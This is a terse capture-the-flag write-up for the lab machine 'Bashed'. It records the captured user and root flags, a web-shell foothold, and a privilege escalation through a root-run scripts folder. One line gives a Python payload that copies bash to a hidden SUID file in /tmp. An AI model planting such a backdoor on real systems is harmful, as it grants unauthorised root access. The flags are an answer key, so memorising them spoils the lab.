# Bashed
```
* IP: 10.10.10.68
* Level: Easy
* OS: Linux
```

# Flags
```
* User: 2c281f318555dbc1b856957c7147bfc1
* Root: cc4f0afe3a1026d402ba10329674a8e2
```

# Enumeration
```
* Only one port open
* On /single.html I got phpbash.php filename
* Visiting /dev/phpbash.php gets us shell
* Shell gives us direct user access.
* Uploading reverse shell to /uploads
* Getting tty shell

```

# Privesc
```
* sudo -l shows that we can run command as scriptmanager
* sudo -u scriptmanager /bin/bash gets us scriptmanager
* /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
* This is running by root
* I put a pytohn script in the /scripts folder
* import os ; os.system("cp /bin/bash /tmp/.test && chmod +xs /tmp/.test")
* after sometime we get a suid bash on /tmp/.test dir
* running /tmp/.test -p gives us root
```

